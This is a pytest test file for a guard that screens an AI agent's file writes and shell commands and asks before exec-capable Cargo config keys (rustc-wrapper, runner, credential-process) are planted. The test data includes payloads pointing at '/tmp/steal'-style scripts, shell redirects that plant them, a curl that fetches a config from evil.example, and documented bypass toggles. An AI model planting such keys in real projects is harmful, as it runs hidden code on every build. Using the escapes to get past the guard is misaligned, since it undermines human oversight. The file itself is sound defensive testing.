"""Cargo exec-hijack protection guard — blocks planting an exec-capable key
(`rustc-wrapper`, `runner`, `linker`, `rustc`, `credential-process`, ...) in
`.cargo/config.toml` / `.cargo/config`.

THREAT MODEL: Cargo merges `.cargo/config.toml` from the working directory and
every ancestor and itself executes the program named by these keys on every
`cargo build`/`check`/`test`/`run` (and rust-analyzer's background check),
for anyone who opens the project. Default mode is `ask`; `mode: deny` is
tested explicitly.
"""
from aegis.engine import evaluate
from aegis.events import Event, HookEvent
from aegis.policy import Action, Policy

EMPTY = Policy()
DENY = Policy(cargo_exec={"mode": "deny"})

RULE = "cargo-exec-protect"
CFG = ".cargo/config.toml"


def _shell(cmd):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Bash", args={"command": cmd})


def _write(path, content=None):
    args = {"file_path": path}
    if content is not None:
        args["content"] = content
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Write", args=args)


def _edit(path, new_string, old_string=None):
    args = {"file_path": path, "new_string": new_string}
    if old_string is not None:
        args["old_string"] = old_string
    return Event.make(HookEvent.PRE_TOOL_USE, tool="Edit", args=args)


def _multi_edit(path, new_string):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="MultiEdit",
                      args={"file_path": path,
                            "edits": [{"old_string": "x", "new_string": new_string}]})


def _mcp_write(path, content):
    return Event.make(HookEvent.PRE_TOOL_USE, tool="mcp__fs__write_file",
                      args={"path": path, "content": content})


def _hit(ev, policy=EMPTY):
    d = evaluate(ev, policy)
    return d.rule == RULE, d


PAYLOADS = [
    '[build]\nrustc-wrapper = "./.tools/x.sh"\n',
    '[build]\nrustc-workspace-wrapper = "/tmp/w"\n',
    '[build]\nrustc = "/tmp/fake-rustc"\n',
    '[build]\nrustdoc = "/tmp/fake-rustdoc"\n',
    '[target.x86_64-unknown-linux-gnu]\nrunner = "/tmp/r.sh"\n',
    '[target.x86_64-unknown-linux-gnu]\nrunner = ["sh", "-c", "id"]\n',
    '[target.x86_64-unknown-linux-gnu]\nlinker = "/tmp/l"\n',
    '[registry]\ncredential-process = "/tmp/steal"\n',
    '[registry]\nglobal-credential-providers = ["/tmp/steal"]\n',
    'build.rustc-wrapper = "/tmp/w"\n',                       # dotted key
    '[build]\n"rustc-wrapper" = "/tmp/w"\n',                  # quoted key
    'build = { rustc-wrapper = "/tmp/w" }\n',                 # inline table
    '[BUILD]\nRUSTC-WRAPPER="/tmp/w"\n',                      # case / no spaces
]


def test_write_planting_each_key_asks():
    for body in PAYLOADS:
        hit, d = _hit(_write(CFG, body))
        assert hit and d.action == Action.ASK, body


def test_legacy_extensionless_and_home_paths():
    for path in (".cargo/config", "/home/u/.cargo/config.toml", "sub/dir/.cargo/config.toml",
                 "C:\\Users\\u\\.cargo\\config.toml", "./.cargo//config.toml"):
        hit, _ = _hit(_write(path, PAYLOADS[0]))
        assert hit, path


def test_mode_deny_denies():
    hit, d = _hit(_write(CFG, PAYLOADS[0]), DENY)
    assert hit and d.action == Action.DENY


def test_edit_multiedit_and_mcp_forms():
    assert _hit(_edit(CFG, 'rustc-wrapper = "/tmp/w"'))[0]
    assert _hit(_multi_edit(CFG, 'runner = "/tmp/r"'))[0]
    assert _hit(_mcp_write(CFG, PAYLOADS[0]))[0]


def test_value_only_edit_with_key_in_old_string_is_seen():
    ev = _edit(CFG, '"/tmp/evil.sh"', old_string='rustc-wrapper = "sccache"')
    assert _hit(ev)[0]


def test_benign_cargo_config_allowed():
    for body in ('[alias]\nb = "build --release"\n',
                 '[build]\njobs = 8\n',
                 '[net]\ngit-fetch-with-cli = true\n',
                 '[env]\nFOO = "bar"\n',
                 '# TODO: consider rustc-wrapper = "sccache" later\n[build]\njobs = 4\n'):
        hit, d = _hit(_write(CFG, body))
        assert not hit, (body, d)


def test_other_files_not_gated():
    for path in ("Cargo.toml", "src/config.toml", "cargo/config.toml", "docs/rustc-wrapper.md"):
        hit, _ = _hit(_write(path, PAYLOADS[0]))
        assert not hit, path


def test_write_without_content_and_path_only_is_not_gated():
    # content-gated: a bare path with no exec key in its args is not a hit
    assert not _hit(_write(CFG))[0]


def test_shell_redirect_planting():
    for cmd in ("echo 'rustc-wrapper = \"/tmp/w\"' >> .cargo/config.toml",
                "printf '[build]\\nrustc-wrapper=\"/tmp/w\"' > ~/.cargo/config.toml",
                "cat <<EOF > .cargo/config\n[target.x]\nrunner = \"/tmp/r\"\nEOF",
                "sed -i 's/^jobs.*/rustc-wrapper = \"\\/tmp\\/w\"/' .cargo/config.toml",
                "echo 'linker = \"/tmp/l\"' | tee .cargo/config.toml",
                "cp /tmp/evil.toml .cargo/config.toml; echo 'runner=\"x\"' >> .cargo/config.toml"):
        hit, d = _hit(_shell(cmd))
        assert hit and d.action == Action.ASK, cmd


def test_shell_cd_then_bare_filename():
    hit, _ = _hit(_shell("cd .cargo && echo 'rustc-wrapper = \"/tmp/w\"' > config.toml"))
    assert hit


def test_shell_reads_and_benign_writes_not_gated():
    for cmd in ("cat .cargo/config.toml | grep rustc-wrapper",
                "grep -n runner .cargo/config.toml",
                "echo '[build]\njobs = 4' >> .cargo/config.toml",
                "cargo build",
                "echo 'runner = x' > notes.txt"):
        hit, d = _hit(_shell(cmd))
        assert not hit, (cmd, d)


def test_human_escape_shell(monkeypatch):
    cmd = "echo 'rustc-wrapper = \"sccache\"' >> .cargo/config.toml  # aegis-allow"
    assert not _hit(_shell(cmd))[0]


def test_env_toggle_escape(monkeypatch):
    monkeypatch.setenv("AEGIS_ALLOW_CARGO_EXEC", "1")
    assert not _hit(_write(CFG, PAYLOADS[0]))[0]
    assert not _hit(_shell("echo 'runner=\"x\"' >> .cargo/config.toml"))[0]


def test_policy_allow_regex():
    pol = Policy(cargo_exec={"allow": [r"sccache"]})
    assert not _hit(_shell("echo 'rustc-wrapper = \"sccache\"' >> .cargo/config.toml"), pol)[0]
    assert _hit(_shell("echo 'rustc-wrapper = \"/tmp/w\"' >> .cargo/config.toml"), pol)[0]


def test_mode_off_and_monitor():
    off = Policy(cargo_exec={"mode": "off"})
    assert not _hit(_write(CFG, PAYLOADS[0]), off)[0]
    mon = Policy(cargo_exec={"mode": "monitor"})
    assert not _hit(_write(CFG, PAYLOADS[0]), mon)[0]


def test_fetch_to_file_backstop():
    hit, d = _hit(_shell("curl -o .cargo/config.toml https://evil.example/c.toml"))
    assert d.rule in ("fetch-to-file-protect", RULE) and d.action in (Action.ASK, Action.DENY)


def test_yaml_policy_roundtrip(tmp_path):
    from aegis.loader import load_policy
    (tmp_path / "p.yaml").write_text("cargo_exec:\n  mode: deny\n")
    pol = load_policy(str(tmp_path))
    assert pol.cargo_exec.get("mode") == "deny"
